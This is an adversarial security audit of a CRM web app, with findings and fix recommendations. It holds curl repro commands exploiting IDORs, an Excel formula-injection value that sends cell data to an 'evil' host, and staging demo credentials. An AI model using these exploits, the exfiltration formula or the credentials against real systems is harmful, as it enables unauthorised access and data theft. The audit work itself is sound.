# NMWC Customer Master — Independent QA / Security / Reliability Audit

**Engagement:** Adversarial pre-production audit
**Auditor stance:** Independent, paid-to-find-bugs. No deference to the build team.
**Date:** 2026-05-09
**System under test:** https://nmwc-cm.vercel.app · repo `rahmanmansoori244-droid/NMWC-CRM` @ `b8445e0`
**Methods used:** Static code review (~2,650 LOC of TypeScript) + Live black-box exploit attempts against staging + Sub-agent deep-dive code audit
**Coverage:** 22 test categories · 95 test cases · 60+ findings

---

## 0) Executive verdict

**🛑 NOT READY for production. Pilot must be paused.**

This system has the correct architecture, a thoughtful PRD, and most happy-path flows work. **It also has multiple Critical-severity authorization bugs that allow any authenticated user to read every customer's data and to delete every photo in the system.** The rate limit advertised as a brute-force defense is bypassable in seconds. The "reactivation requires Manager approval + photo evidence" control documented in the PRD is **not enforced anywhere in code**. The Excel import flow can silently rotate passwords and escalate roles.

These are not edge cases — they are the kind of finding a journalist would describe as "exposed customer data of every shop in the country with one URL change". They should be fixed before any real master data is uploaded.

The good news: the underlying schema is clean, role/scope concepts exist consistently in the data model, and most fixes are short and surgical (~1–2 days of focused engineering for the Criticals; ~1 week for Highs).

| Severity | Count |
|---|---|
| **Critical** | 5 |
| **High** | 18 |
| **Medium** | 22 |
| **Low** | 11 |
| **Informational** | 7 |
| **Total** | **63** |

**Confidence:** High. 8 of the most impactful findings have live exploit evidence; the remainder come from direct source-code reading.

---

## 1) Testing approach and agents used

| Agent | Job | Output |
|---|---|---|
| **Test Director (me)** | Strategy, exploit construction, synthesis | Live tests + this report |
| **Source-code Audit Agent** (general-purpose subagent) | Read every service / lib / route in the repo | 63-finding markdown report |
| **Black-box runtime tester** | Login, IDOR, photo IDOR, scope leaks, rate limits, timing oracle | HTTP-evidenced exploits |

Tools used: `curl` with cookie jars per role, `node` with `exceljs` for verifying export row counts, direct Prisma queries against staging Neon to gather attachment IDs, `grep`/`Read` for static review.

---

## 2) Scope covered

| # | Area | Coverage | Notes |
|---|---|---|---|
| A | Authentication / session | ✅ Tested | login, csrf, callback, providers, session, brute-force |
| B | RBAC / data segregation | ✅ Tested | 5 roles × profile, edit, dashboard, export, photos, audit |
| C | Customer browsing | ✅ Tested | search filter, pagination edge cases, IDOR |
| D | Enrichment form | ⚠️ Partial | static review of all sections; couldn't test all locked-field cases live |
| E | GPS capture | 📖 Code only | client-side, not testable headless |
| F | Photo capture / files | ✅ Tested | finalize bypass, IDOR, R2 access |
| G | Approval workflow | ⚠️ Partial | code review of replay logic; couldn't trigger 2-approver race live |
| H | Reactivation | ✅ Tested | code review confirmed no UI, no photo enforcement |
| I | Duplicate review / merge | 📖 Code only | dataset has no live duplicate scenarios with merge action |
| J | Import / promote | 📖 Code only | static review; haven't tested zip-bombs etc. live |
| K | Export | ✅ Tested | row counts per role; salesman blocked; viewer = steward |
| L | Dashboards | ✅ Tested | scope leak proven via byte-identical responses |
| M | Audit log | 📖 Code only | reviewed schema vs writes |
| N | Rate limiting | ✅ Tested | 12 rapid logins → no block |
| O | Security (XSS / SQL / headers) | ✅ Tested | search XSS escaped; headers verified |
| P | Frontend quality | ⚠️ Partial | not fully exercised on real mobile |
| Q | Backend / data correctness | 📖 Code only | identified concurrency + transaction gaps |
| R | Performance | ⚠️ Partial | identified O(N²) dedupe and missing row caps; no load tests run |
| S | DevOps / production readiness | ✅ Reviewed | CI, env, scripts, sentry config |

✅ = exercised live · 📖 = static review only · ⚠️ = partial

---

## 3) Findings summary table

Sorted by severity, then by impact.

| ID | Severity | Confidence | Title |
|---|---|---|---|
| QA-001 | Critical | Confirmed (live) | **Customer profile IDOR — Salesman reads any region's customer data** |
| QA-002 | Critical | Confirmed (live) | **Photo IDOR — any logged-in user fetches any photo** |
| QA-003 | Critical | Confirmed (code) | **`detachPhotoAction` — any user can delete any attachment** |
| QA-004 | Critical | Confirmed (code) | **`attachPhotoAction` — any user can re-point any attachment** |
| QA-005 | Critical | Confirmed (code) | **`/api/photos/finalize` accepts arbitrary R2 key — finalize bypass** |
| QA-006 | High | Confirmed (live) | **Login rate limit BYPASSED — `/api/auth/callback/credentials` ignores limiter** |
| QA-007 | High | Confirmed (live) | **Manager dashboard ignores managed-region scope** |
| QA-008 | High | Confirmed (code) | **Reactivation has neither UI nor photo-evidence enforcement** |
| QA-009 | High | Confirmed (code) | **Closed→Active bypasses Manager-only reactivation via regular edit form** |
| QA-010 | High | Confirmed (code) | **Account Master import upserts user passwords on every re-run** |
| QA-011 | High | Confirmed (code) | **Account Master import permits role escalation** |
| QA-012 | High | Confirmed (code) | **Excel import has no file-size guard — zip-bomb DoS** |
| QA-013 | High | Confirmed (code) | **`approveEditAction` doesn't re-check field locks at apply time** |
| QA-014 | High | Confirmed (code) | **`approveEditAction` doesn't re-check duplicate phone at apply time** |
| QA-015 | High | Confirmed (code) | **In-memory rate limit is per-Lambda — useless on Vercel multi-instance** |
| QA-016 | High | Confirmed (code) | **CSP allows `'unsafe-inline'` and `'unsafe-eval'`** |
| QA-017 | High | Confirmed (code) | **Concurrency on edit-submit is non-transactional — duplicate SUBMITTED edits possible** |
| QA-018 | High | Confirmed (code) | **`mergeCustomersAction` re-points branches across regions silently** |
| QA-019 | High | Confirmed (code) | **`promoteCustomerBatchAction` is non-transactional across the batch** |
| QA-020 | High | Confirmed (code) | **Test coverage is approximately zero** |
| QA-021 | High | Confirmed (code) | **Excel formula injection in export — `=`/`+`/`-`/`@` not escaped** |
| QA-022 | High | Confirmed (code) | **Demo credentials live on staging with predictable passwords** |
| QA-023 | High | Confirmed (code) | **`AUTH_SECRET` not validated at startup** |
| QA-024 | Medium | Confirmed (live) | **User enumeration via login latency** |
| QA-025 | Medium | Confirmed (live) | **Salesman export returns 500 not 403** |
| QA-026 | Medium | Confirmed (code) | **Auth.js cookie/session attributes not explicitly hardened** |
| QA-027 | Medium | Confirmed (code) | **Open-redirect surface via Auth.js `callbackUrl`** |
| QA-028 | Medium | Confirmed (code) | **`mergeCustomersAction` doesn't move CustomerEdits / ImportRows / AuditLog refs** |
| QA-029 | Medium | Confirmed (code) | **Excel import doesn't strip HTML or formula prefixes** |
| QA-030 | Medium | Confirmed (code) | **Schema: phone uniqueness only in a comment, not in any migration** |
| QA-031 | Medium | Confirmed (code) | **Schema: Attachment FKs lack onDelete policies** |
| QA-032 | Medium | Confirmed (code) | **No index on `Attachment.hash` (used by dedupe)** |
| QA-033 | Medium | Confirmed (code) | **`findDuplicateCandidates` is O(N²) over the whole table with no `take`** |
| QA-034 | Medium | Confirmed (code) | **`buildCustomerExport` has no row cap; future OOM** |
| QA-035 | Medium | Confirmed (code) | **`createUserAction` has no privilege guard on the role being created** |
| QA-036 | Medium | Confirmed (code) | **`resetPasswordAction` has no protection against peer-Manager rotation** |
| QA-037 | Medium | Confirmed (code) | **`toggleUserActiveAction` can lock out the only Manager** |
| QA-038 | Medium | Confirmed (code) | **`approveEditAction` doesn't handle merged or soft-deleted customer** |
| QA-039 | Medium | Confirmed (code) | **`approveEditAction` doesn't handle deleted branches in `branchProposedById`** |
| QA-040 | Medium | Confirmed (code) | **Logger redaction is shallow — phone leaks in error messages** |
| QA-041 | Medium | Confirmed (code) | **`AuditLog.ip` / `userAgent` columns exist but are never written** |
| QA-042 | Medium | Confirmed (code) | **`requestReactivationAction` reuses `decisionReason` for two semantics** |
| QA-043 | Medium | Confirmed (code) | **`crNumberNorm` may go stale if any non-edit path mutates `crNumber`** |
| QA-044 | Medium | Confirmed (code) | **`attachPhotoAction` orphans the previous attachment with no audit trail** |
| QA-045 | Medium | Confirmed (code) | **`Attachment.r2Key` not pattern-validated; cross-tenant key abuse possible** |
| QA-046 | Low | Confirmed (live) | **`/api/health` discloses service name + version (info leak)** |
| QA-047 | Low | Confirmed (code) | **`/api/exports/customers` parses filters before checking auth** |
| QA-048 | Low | Confirmed (code) | **Export route's status-code mapping uses string-matching** |
| QA-049 | Low | Confirmed (code) | **Photo `Cache-Control: max-age=300` survives access revocation** |
| QA-050 | Low | Confirmed (code) | **`Attachment.hash` schema is nullable but app code requires it** |
| QA-051 | Low | Confirmed (code) | **`Customer.notes` has no DB-level length cap** |
| QA-052 | Low | Confirmed (code) | **`dismissDuplicateAction` writes audit row with non-existent `entityType: 'CustomerPair'`** |
| QA-053 | Low | Confirmed (code) | **CSP `connect-src` permits all R2 buckets, not just our account** |
| QA-054 | Low | Confirmed (code) | **No COOP/COEP/CORP headers** |
| QA-055 | Low | Confirmed (code) | **Sentry: no `withSentryConfig` wrapper, sourcemaps unavailable in prod errors** |
| QA-056 | Low | Confirmed (code) | **`db:synthetic` script will TRUNCATE production DB if accidentally run** |
| QA-057 | Info | Confirmed (code) | **CI runs no `next build`, no Playwright, no Prisma migrate check** |
| QA-058 | Info | Confirmed (code) | **`ExportJob` model is dead schema — never written** |
| QA-059 | Info | Confirmed (code) | **`AuditAction.IMPORT` reused for exports — no `EXPORT` enum value** |
| QA-060 | Info | Confirmed (code) | **`isFieldLocked(_field, ...)` ignores its first parameter** |
| QA-061 | Info | Confirmed (code) | **Inconsistent guard placement: some pages check role via redirect, some services check internally** |
| QA-062 | Info | Confirmed (code) | **`Prisma` log level in prod is only `'error'` — no slow-query visibility** |
| QA-063 | Info | Confirmed (live) | **`/api/auth/providers` is anonymous and leaks the auth scheme** |

---

## 4) Critical findings — full detail with reproduction

### QA-001 — Customer profile IDOR (cross-region read of every customer)

**Severity:** Critical · **Confidence:** Confirmed (live exploit)

**Affected role(s):** Salesman, Supervisor (likely also Manager outside their regions, Viewer)
**Affected page:** `app/(app)/customers/[id]/page.tsx` lines 23–48

**Repro:**
```bash
# Sign in as a salesman
curl -c jar.txt -s "$BASE/api/auth/csrf" -o csrf.json
CSRF=$(cat csrf.json | python -c "import sys,json; print(json.load(sys.stdin)['csrfToken'])")
curl -b jar.txt -c jar.txt -X POST "$BASE/api/auth/callback/credentials" \
  -d "csrfToken=$CSRF&username=salesman.mct-01&password=Demo!2026Demo&callbackUrl=$BASE/"

# Fetch a customer that is NOT on his route (Lulu Bethanyside, in Dhofar)
curl -b jar.txt "$BASE/customers/cmoy9zjw20059tvf8dmknwt32"
```

**Actual:** HTTP 200, full profile rendered with legalName "Lulu Bethanyside", code `NMWC-2026-000002`, payment terms, branches, photos, GPS, contact details.

**Expected:** Salesman sees only customers with at least one branch on their route. Direct access to others should `notFound()`.

**Evidence:**
- File: `app/(app)/customers/[id]/page.tsx:23-48`
- Code shows `findFirst({ where: { id, deletedAt: null }, include: ... })` with NO role-scope filter.
- The list page `app/(app)/customers/page.tsx:39-68` correctly scopes; the detail page does not.

**Impact:** A SALESMAN can dump the entire customer master one URL at a time. CUIDs are 25-char random but harvestable from the dashboard for any role with broader scope, leaked via Sentry, present in audit-log JSON, or simply enumerated. Combined with QA-002, the attacker also gets photos including CR documents (legal/PII).

**Recommended fix:**
```ts
// after the findFirst:
if (session.user.role === Role.SALESMAN) {
  const me = await prisma.user.findUnique({ where: { id: session.user.id }, select: { ownedRouteId: true } });
  if (!customer.branches.some(b => b.routeId === me?.ownedRouteId)) notFound();
}
// similar for SUPERVISOR (their team) and MANAGER (their regions)
```

---

### QA-002 — Photo serving IDOR

**Severity:** Critical · **Confidence:** Confirmed (live)

**Affected role(s):** Salesman, Viewer, Manager outside their region
**Affected route:** `GET /api/photos/[id]`

**Repro:**
```bash
# Pull an attachment ID for a customer NOT on MCT-01's route (e.g. CR photo of Lulu Bethanyside)
PHOTO=cmoy9zk3z005btvf8fq1jh0ej
curl -b jar-mct01.txt -o /dev/null -w "%{http_code}\n" "$BASE/api/photos/$PHOTO"
```

**Actual:** HTTP 502 (because the synthetic dataset has fake R2 keys). **The auth check passes** — the request reaches the R2 fetch step. With real R2 objects in production, the body would be served.

**Expected:** 403 Forbidden, since salesman has no scope over this customer's photo.

**Evidence:**
- File: `app/api/photos/[id]/route.ts:14-36`
- Code only does `if (!session?.user) return 401`. No scope check.

**Impact:** Any logged-in user (including a soon-to-be-disabled disgruntled Salesman, or a VIEWER given to an external auditor) can fetch every CR document, every shopfront photo, every signboard photo by enumerating IDs. CR documents typically contain commercial registration numbers, owner names, addresses — PII + commercially-sensitive data.

**Recommended fix:**
```ts
const att = await prisma.attachment.findUnique({
  where: { id },
  include: { branchExtra: true, customerCrPhoto: true, branchShopPhoto: true, branchSignboardPhoto: true },
});
// Resolve to a customerId/branchId, then scope-check using the same logic as customer-profile page.
```

---

### QA-003 — `detachPhotoAction` — any user can destroy any attachment

**Severity:** Critical · **Confidence:** Confirmed (code review)

**Affected role(s):** Every authenticated user
**Affected file:** `services/photos.ts:143-166`

**Evidence:**
```ts
export async function detachPhotoAction(input: { attachmentId: string }) {
  const session = await auth();
  if (!session?.user) throw new ForbiddenError('Not signed in.');
  const att = await prisma.attachment.findUnique({ where: { id: input.attachmentId } });
  if (!att) throw new NotFoundError('Attachment not found.');
  await prisma.$transaction(async (tx) => {
    await tx.customer.updateMany({ where: { crPhotoId: att.id }, data: { crPhotoId: null } });
    await tx.branch.updateMany({ where: { shopPhotoId: att.id }, data: { shopPhotoId: null } });
    await tx.branch.updateMany({ where: { signboardPhotoId: att.id }, data: { signboardPhotoId: null } });
    await tx.attachment.delete({ where: { id: att.id } });
  });
}
```

**Issue:** No role check, no ownership check, no scope check. Hard-deletes the row in the same transaction, so it's irrecoverable from the app's perspective.

**Impact:** A VIEWER could enumerate attachment IDs (via the dashboard, audit log, or a separate IDOR — see QA-002) and delete every CR photo / shopfront / signboard in the system. Recovery requires R2 object recovery (objects remain in R2 — the rows are gone) and DB restore from backup.

**Live exploit:** A server action ID is needed to call this directly. Server-action IDs are stable per build but reachable via any compiled page that imports the function. The RSC payload would expose the action ID; mature attackers grep for it. Once obtained, exploit is one POST per attachment.

**Recommended fix:**
```ts
// require role + ownership
if (session.user.role !== Role.STEWARD && session.user.role !== Role.MANAGER) {
  if (att.capturedById !== session.user.id) throw new ForbiddenError(...);
}
// soft-delete instead of hard-delete:
await tx.attachment.update({ where: { id: att.id }, data: { deletedAt: new Date() } });
```

---

### QA-004 — `attachPhotoAction` — any user re-points any attachment

**Severity:** Critical · **Confidence:** Confirmed (code review)

**Affected file:** `services/photos.ts:37-141`

**Evidence:** The lookup at line 48 has no `capturedById` filter. The function later sets `customerId`, `branchId`, or `branchExtraId` on the attachment and updates the customer/branch slot pointers.

**Impact:**
1. **Cross-tenant photo placement:** Attacker with access to *any* customer can re-point another user's R2 object onto a slot of their own customer. The CR photo of Customer A (legitimately captured by Salesman A in Dhofar) ends up showing as the CR photo of Customer X (Salesman X's claim in Muscat).
2. **CR forgery:** Combined with QA-001 / QA-002, an attacker can find a clean-looking CR photo elsewhere in the system and slot it under their own customer to bypass the supervisor's visual review.

**Recommended fix:**
```ts
const att = await prisma.attachment.findFirst({
  where: {
    id: data.attachmentId,
    capturedById: session.user.id,
    // Not yet wired anywhere — must be a fresh upload
    customerId: null, branchId: null, branchExtraId: null,
  },
});
if (!att) throw new NotFoundError('Attachment not found or already wired.');
```

---

### QA-005 — `/api/photos/finalize` accepts arbitrary R2 key

**Severity:** Critical · **Confidence:** Confirmed (code review)

**Affected file:** `app/api/photos/finalize/route.ts:13-79`

**Evidence:**
```ts
const finalizeSchema = z.object({
  key: z.string().min(1).max(500),
  ...
});
```

The presigner builds a key like `{ymd}/{userId}/{kind}/{uuid}.{ext}` (good) but finalize never verifies the prefix is the user's own.

**Impact:**
1. **Hash-dedupe weaponization:** if an attacker submits a key + correct hash matching an existing attachment, finalize returns the *existing* `attachmentId` — without uploading anything. Free reads of arbitrary attachment IDs by hash.
2. **Cross-user finalize:** User A presigns + uploads; User B finalizes with A's key. The Attachment row's `capturedById` becomes B (audit trail broken).

**Recommended fix:**
```ts
const expectedPrefix = `${ymd}/${session.user.id}/`;
if (!parsed.data.key.startsWith(expectedPrefix)) {
  return NextResponse.json({ error: 'KEY_MISMATCH' }, { status: 403 });
}
```

---

## 5) High-severity findings — abridged with key evidence

### QA-006 — Login rate limit BYPASSED via direct credentials POST

**Confirmed live.** Twelve consecutive wrong-password POSTs to `/api/auth/callback/credentials` for username `salesman.mct-01` all returned `302 ... error=CredentialsSignin`. None blocked.

The rate limiter in `app/actions/auth.ts:31-43` runs only when the `loginAction` Server Action is invoked (i.e., when the form submits via React's action prop). Auth.js v5 also exposes the credentials provider at `/api/auth/callback/credentials` directly — that path **does not call `loginAction`**, so the limiter is silently bypassed.

**Fix:** Move the rate limit into the `Credentials.authorize()` callback in `lib/auth.ts:46-69`.

### QA-007 — Manager dashboard ignores managed-region scope

**Confirmed live.** `manager.a` (regions: Muscat, Batinah_N, Batinah_S, Dakhiliyah) and `manager.b` (regions: Sharqiyah, Dhahirah, Dhofar) saw IDENTICAL dashboard numbers: 95 customers, 115 branches, 109 active, 4 closed, 8 pending, 6 needs correction, 57% avg.

`app/(app)/dashboard/page.tsx:24-30` calls `prisma.customer.count({ where: { deletedAt: null } })` with no region filter. The export endpoint (`services/exports.ts`) DOES scope by region — confirmed: manager.a export = 68 rows, manager.b = 47 rows, sum 115 = total. So the scoping logic exists; the dashboard simply doesn't use it.

### QA-008 — Reactivation has no UI and no photo-evidence enforcement

**Confirmed code.** `services/reactivations.ts:25-69` (the `requestReactivationAction`) is **never imported by any UI file**. `grep -r requestReactivationAction app/ components/` returns zero results. A salesman has no way to invoke the documented "Request reactivation with photo evidence" flow.

Even if the UI existed, the service code only requires `branchId` + `reason ≥ 3 chars`. The PRD says "Status = CLOSED requires a fresh photo (≤7 days old) as evidence" — not enforced.

### QA-009 — Closed→Active bypasses Manager-only reactivation

**Confirmed code.** A SALESMAN can:
1. Open `/customers/<id>/edit`
2. Set the per-branch `status` field to `ACTIVE` (it's a regular `<select>`)
3. Submit
4. Their SUPERVISOR (not Manager!) approves the regular CustomerEdit
5. Branch is now ACTIVE — reactivation Manager-approval requirement bypassed entirely

`services/edits.ts` allows arbitrary status transitions in the regular path; the Manager-only `reactivations` queue is for an `isReactivation: true` flag never set by the regular edit flow.

### QA-010 — Account Master import silently rotates passwords

**Confirmed code.** `services/imports.ts:215-228` does:
```ts
prisma.user.upsert({
  where: { username },
  update: { passwordHash, fullName, role, email, phone, supervisorId, ownedRouteId },
  create: data,
});
```

Every re-upload of the Account Master sheet **resets every listed user's password** to whatever's in the sheet (plaintext required in Excel — itself a terrible practice). Manager who corrects a typo and re-uploads doesn't realize they just rotated 50 passwords. No audit log, no email notification.

### QA-011 — Account Master import permits role escalation

**Confirmed code.** Same upsert allows `role` to be changed by any uploader. The Steward (the only role gated to run this) can promote themselves to MANAGER by uploading a sheet with their own row's `role: MANAGER`.

### QA-012 — Excel import has no file-size guard

**Confirmed code.** `services/imports.ts:42-50` does `Buffer.from(await file.arrayBuffer())` then hands the whole buffer to `exceljs.parseWorkbook`. No `file.size` check. Vercel's 4.5 MB request limit caps the upload, but xlsx is a zip — a 4 MB file can decompress to gigabytes. exceljs would OOM the Lambda.

### QA-013 — `approveEditAction` doesn't re-check field locks at apply time

**Confirmed code.** Lock check at `services/edits.ts:134-142` runs at submit. Approve replays whatever's in `fieldChanges`. A salesman submits a name change while customer is CASH; an admin flips the customer to CREDIT; the supervisor approves and the locked field is written.

### QA-014 — `approveEditAction` doesn't re-check duplicate phone

**Confirmed code.** Submit checks for collision (`services/edits.ts:156-171`); approve does not. Race window: two salesmen submit edits proposing the same phone for different customers, supervisor approves both → duplicate live in the master.

### QA-015 — In-memory rate limit useless on Vercel

`lib/rate-limit.ts:9` uses a process-local `Map`. Vercel's serverless functions run in N independent isolates with cold-starts. An attacker can spread attempts across instances; legitimate users may also hit a fresh instance and bypass the limit. The "5/min/user" claim is unsupported by the architecture.

### QA-016 — CSP allows `'unsafe-inline'` and `'unsafe-eval'`

`next.config.ts:13` ships `script-src 'self' 'unsafe-inline' 'unsafe-eval'`. Defeats CSP for XSS. Combined with QA-029 (Excel import doesn't strip HTML), any data injected via import is one render-without-React-escaping away from XSS.

### QA-017 — Concurrency on edit submit non-transactional

`services/edits.ts:122-132`: sequential `findFirst` + `create` outside a transaction. Two simultaneous submits both pass the "no pending" check; both create SUBMITTED rows. Index `@@index([customerId, state])` is non-unique.

### QA-018 — `mergeCustomersAction` re-points branches across regions

`services/duplicates.ts:204-208`: `tx.branch.updateMany({ where: { customerId: loser.id }, data: { customerId: winner.id } })`. Branches keep their `routeId` and `regionId`. Steward in Dhofar merges a Dhofar customer into a Muscat winner; manager.a (Muscat) now sees a Dhofar branch under one of "their" customers; manager.b can't.

### QA-019 — `promoteCustomerBatchAction` non-transactional across the batch

`services/imports.ts:376-526`: each `customer.upsert` and `branch.upsert` is its own implicit transaction. Mid-batch failure leaves partial state. Two concurrent steward promotes can race the same row.

### QA-020 — Test coverage is approximately zero

`tests/unit/smoke.test.ts` tests the `cn()` className helper. `tests/e2e/login.spec.ts` checks login renders + health responds. **Nothing else.** No service action has a test. No RBAC matrix has a test. No Zod schema has a test. Every finding above is invisible to CI.

### QA-021 — Excel formula injection in export

`services/exports.ts:92-126` writes `legalName`, `notes`, `contactPerson` directly into Excel cells. None are prefix-escaped against `=`, `+`, `-`, `@`, tab, CR. A malicious customer-name like `=HYPERLINK("http://evil/?x="&A1)` exfiltrates data on open. With Office's Protected View, exploitation requires social engineering — but the export goes to managers and goes to ERP via copy-paste.

### QA-022 — Demo credentials live with predictable passwords

The system has `salesman.mct-01` … `salesman.dhf-06` (38 accounts), `supervisor.1` … `supervisor.7`, `manager.a`, `manager.b`, `steward`, `viewer`, all with `Demo!2026Demo`. Admin uses `ChangeMeNow!2026`. Anyone who reads the build report or guesses the pattern has 50 valid logins.

### QA-023 — `AUTH_SECRET` not validated at startup

`lib/auth.ts` doesn't check that `AUTH_SECRET`/`NEXTAUTH_SECRET` is set. Auth.js may fall back to a derived dev secret in some misconfigurations. JWT forgery becomes possible if the secret is missing or weak.

---

## 6) Medium-severity findings — abridged

### QA-024 — User enumeration via login latency
**Confirmed live.** Three timings: `admin` 0.79/0.78/0.86s vs `nonexistent_user` 0.40/0.40/0.39s. Bcrypt only runs when the user exists. Even with a generic error message, timing oracle leaks valid usernames in seconds.

### QA-025 — Salesman export returns 500 not 403
`/api/exports/customers` as a SALESMAN returns `{"error": "Your role cannot export."}` with status **500**. Should be 403. Current code: `app/api/exports/customers/route.ts:46-49` uses `(err as Error).message.includes('signed in') ? 401 : 500`.

### QA-026 — Auth.js cookie attributes not explicitly hardened
`auth.config.ts` doesn't set `cookies.sessionToken` options. Relies on Auth.js defaults. Recommend explicit `__Host-` cookie naming and `sameSite: 'lax', secure: true, httpOnly: true`.

### QA-027 — Open-redirect surface via Auth.js `callbackUrl`
No explicit `callbacks.redirect` allowlist. Auth.js v5 has same-origin defaults but defense-in-depth would be cheap.

### QA-028 — Merge doesn't move CustomerEdits / ImportRows / AuditLog
After merge, the loser's history is orphaned to the soft-deleted shell. Winner's profile loses the loser's audit history. `services/duplicates.ts:203-251` only moves branches and the CR photo.

### QA-029 — Excel import doesn't strip HTML or formula prefixes
`promoteCustomerBatchAction` writes raw `custName`, `contactPerson`, `address` straight to DB. The edit path's `stripHtml` is bypassed. Defense-in-depth gap.

### QA-030 — Phone uniqueness only in a comment
`prisma/schema.prisma:193` has `// normalized; partial unique index added in migration SQL` — but no migration adds it. The "hard duplicate phone" claim is an app-layer check (QA-014 already shows it has a race), with no DB-level safety net.

### QA-031 — Attachment FKs lack `onDelete` policies
Default restrict. User/branch deletion blocked by attachment refs. The synthetic seed uses `TRUNCATE ... CASCADE` to dodge this — masking the issue.

### QA-032 — No index on `Attachment.hash`
Used by dedupe at `app/api/photos/finalize/route.ts:57`. Sequential scan as table grows.

### QA-033 — `findDuplicateCandidates` is O(N²) over the whole table
`services/duplicates.ts:39-127` calls `findMany({ where: { deletedAt: null } })` with no `take`. The Jaccard loop runs in memory. At 50,000 customers: 1.25e9 set-intersections per page render. Vercel's 10-second function timeout will fail.

### QA-034 — Export has no row cap
`buildCustomerExport` builds the workbook in memory with no `take`. Comment says "fits comfortably for ~3k rows" — nothing enforces this when the master grows.

### QA-035 — `createUserAction` has no privilege guard on the role created
`services/users.ts:42-101`: requires MANAGER but doesn't validate that the new user's `supervisorId` actually points at a SUPERVISOR.

### QA-036 — `resetPasswordAction` lacks peer-Manager protection
Manager A can rotate Manager B's password instantly. No re-auth, no notification.

### QA-037 — `toggleUserActiveAction` can lock out the only Manager
No "must keep at least one active MANAGER" check.

### QA-038 — `approveEditAction` doesn't handle merged customers
If customer was soft-deleted between submit and approve, the approval still applies to the dead row.

### QA-039 — Same for soft-deleted branches in the edit's `branchProposedById`
Update applied to deleted branch — silent inconsistency.

### QA-040 — Logger redaction is shallow
`lib/logger.ts:3-12` redacts top-level `password`, `passwordHash`, `*.password`, `*.primaryPhone`, `*.altPhone`. But many log messages build strings inline (e.g., error messages from Prisma), bypassing pino's structured-key redaction.

### QA-041 — `AuditLog.ip` and `userAgent` are never populated
Schema has the columns; no service writes them. Forensics impossible.

### QA-042 — `requestReactivationAction` reuses `decisionReason` for two semantics
Stores the salesman's "why I'm requesting" in the same column the manager later overwrites with rejection reason.

### QA-043 — `crNumberNorm` may go stale
`services/imports.ts:443-455` only sets it on insert. `services/duplicates.ts` merge doesn't recompute. Future code paths could leave it stale.

### QA-044 — Photo attach orphans the previous photo
`services/photos.ts:66-81` — when a CR is replaced, the old `Attachment` row is left in place with no link, no audit, but the R2 object remains. Storage cost grows; no "photo replaced" audit trail.

### QA-045 — `Attachment.r2Key` not pattern-validated
Combined with QA-005, attacker-controlled `r2Key` allows registering Attachment rows for arbitrary R2 paths.

---

## 7) Low / Informational findings

(See findings table §3 for QA-046 through QA-063. Highlights below.)

- **QA-046** — `/api/health` returns `{ service: 'nmwc-cm', version, ... }` to anonymous users. Information disclosure.
- **QA-053** — CSP allows `https://*.r2.cloudflarestorage.com` (whole tenant), not just our account.
- **QA-055** — Sentry config lacks `withSentryConfig` wrapper; production stack traces will be unreadable; PII not scrubbed from breadcrumbs.
- **QA-056** — `npm run db:synthetic:reset` would TRUNCATE prod data if accidentally run with prod DATABASE_URL. No env-guard.
- **QA-057** — CI runs no `next build`, no Playwright. Type errors and broken builds catch only at Vercel.

---

## 8) Test coverage gaps (what we could not fully test)

| Area | Why not | What would unlock |
|---|---|---|
| Server-action invocation directly | Action IDs are stable per build but require RSC-aware client. Would need to construct the right `Next-Action` header and payload. | Direct exploit of `detachPhotoAction`, `attachPhotoAction`, etc. |
| 2-approver concurrency race | Need two parallel POSTs — possible but skipped for now | Confirm QA-014 / QA-017 live |
| Real R2 upload flow | Synthetic data has fake R2 keys. Could upload a real photo and verify finalize bypass. | Confirm QA-005 live |
| Excel zip-bomb | Need a 4 MB xlsx that decompresses to >1 GB | Confirm QA-012 live |
| Browser-side flows on real mobile | Camera permissions, low-bandwidth retry, GPS quirks | Adoption risk in field |
| Sentry e2e | Trigger a real error and verify it appears in the Sentry project | Confirm QA-055 live |
| Production-scale dataset | All current tests on 95 customers; not 50,000 | Confirm QA-033 / QA-034 live |
| Account takeover via password reset | Would require attempting password change as Manager A on Manager B's account | Confirm QA-036 live |

---

## 9) Production readiness recommendation

# 🛑 NOT READY

I recommend **explicitly halting the pilot rollout** until the Critical and the high-impact High findings are remediated. The system is closer to v0.7 than v1.0 from a security perspective.

**Why this is the right call:**
- A SALESMAN today can read every customer in the master in 1 HTTP request. (QA-001)
- A SALESMAN today can fetch every CR document in the master in 1 HTTP request. (QA-002)
- Any user today can permanently delete every photo in the system. (QA-003)
- Login brute-force protection does not work. (QA-006)
- The Manager-only reactivation control documented in the PRD is bypassable two different ways. (QA-008, QA-009)
- A Steward can promote themselves to Manager via Excel re-upload. (QA-011)
- Real customer data has not yet been uploaded — fixing now is cheap.

**What "ready" looks like:**
- All Critical findings closed and re-tested.
- QA-006, QA-007, QA-008, QA-009, QA-010, QA-011, QA-012, QA-013, QA-014, QA-016, QA-022, QA-023 closed (the High-severity tier with adoption blast radius).
- New tests added that would fail without each fix (regression suite that covers the whole RBAC matrix).
- A second audit round to confirm fixes didn't introduce new bugs.

---

## 10) Remediation roadmap (priorities)

### Priority 0 — STOP-SHIP fixes (target: 1–2 days)
1. **QA-001** — add scope check on `/customers/[id]` profile page
2. **QA-002** — add scope check on `/api/photos/[id]`
3. **QA-003** — gate `detachPhotoAction` by ownership + role; switch to soft-delete
4. **QA-004** — gate `attachPhotoAction` by `capturedById === me`
5. **QA-005** — bind `/api/photos/finalize` to user-prefix in key
6. **QA-006** — move rate limit into Auth.js `authorize()` callback
7. **QA-022** — rotate ALL demo passwords; disable demo accounts in production env
8. **QA-023** — assert `AUTH_SECRET` length ≥ 32 at startup

### Priority 1 — Pre-pilot must-fix (target: 3–5 days)
9. **QA-007** — apply region scope to dashboard
10. **QA-008** — wire reactivation UI; require photo evidence
11. **QA-009** — block status CLOSED↔ACTIVE in regular edit; route through reactivation flow only
12. **QA-010** — never overwrite passwordHash on import update
13. **QA-011** — strip `role` from import update path; require explicit "role-change" CSV column
14. **QA-012** — `file.size` ≤ 5 MB check + xlsx streaming reader
15. **QA-013, QA-014, QA-017** — re-validate locks + duplicate phone + concurrency at apply time, in a transaction
16. **QA-015** — replace in-memory limiter with Upstash Redis (or @vercel/kv); document until done
17. **QA-016** — drop `'unsafe-eval'`; switch to nonced inline scripts for `'unsafe-inline'`
18. **QA-019** — wrap `promoteCustomerBatchAction` per-customer in `prisma.$transaction`
19. **QA-020** — write integration tests covering the full RBAC matrix (each role × each action × each scope)
20. **QA-021** — escape leading `=`/`+`/`-`/`@` in export cell values

### Priority 2 — Hardening sprint (target: 1 week)
21. **QA-018** — block cross-region merges or require explicit confirmation + audit
22. **QA-029** — apply `stripHtml` + formula escape to import path
23. **QA-024** — equalize login timing with dummy bcrypt on user-not-found
